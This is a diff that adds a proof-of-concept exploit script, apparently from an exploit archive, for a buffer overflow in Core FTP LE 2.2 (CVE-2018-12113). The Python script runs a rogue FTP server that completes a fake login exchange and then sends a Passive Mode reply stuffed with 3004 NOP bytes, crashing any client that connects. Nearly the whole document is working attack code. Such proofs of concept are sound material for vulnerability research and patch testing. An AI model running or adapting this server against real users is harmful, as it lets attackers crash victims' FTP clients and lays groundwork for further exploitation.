@@ -1,0 +1,50 @@
+# Exploit Title: Core FTP LE 2.2 - Buffer Overflow (PoC)
+# Date: 2018-06-28
+# Exploit Author: Berk Cem Göksel
+# Vendor Homepage: http://www.coreftp.com/
+# Software Link: http://www.coreftp.com/download
+# Version:  Core FTP Client LE v2.2 Build 1921
+# Tested on: Windows 10
+# Category: Dos
+# CVE : CVE-2018-12113
+# coding: utf-8
+
+# Description:]
+# The vulnerability was discovered during a vulnerability research lecture.
+# This is meant to be a PoC.
+
+#!/usr/bin/env python
+
+import socket
+
+IP = '0.0.0.0'
+port = 21
+
+
+Stack_beginning = 3004
+
+buff = "\x90" * (3004)
+
+try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((IP, port))
+        s.listen(20)
+        print("[i] FTP Server started on port: "+str(port)+"\r\n")
+except:
+        print("[!] Failed to bind the server to port: "+str(port)+"\r\n")
+
+while True:
+    conn, addr = s.accept()
+    conn.send('220 Welcome!' + '\r\n')
+    print conn.recv(1024)
+    conn.send('331 OK.\r\n')
+    print conn.recv(1024)
+    conn.send('230 OK.\r\n')
+    print conn.recv(1024)
+    conn.send('215 UNIX Type: L8\r\n')
+    print conn.recv(1024)
+    conn.send('257 "/" is current directory.\r\n')
+    print conn.recv(1024)
+    conn.send('227 Entering Passive Mode (' + buff +  ')\r\n')
+    print conn.recv(1024)
+    conn.send('257' + '\r\n')
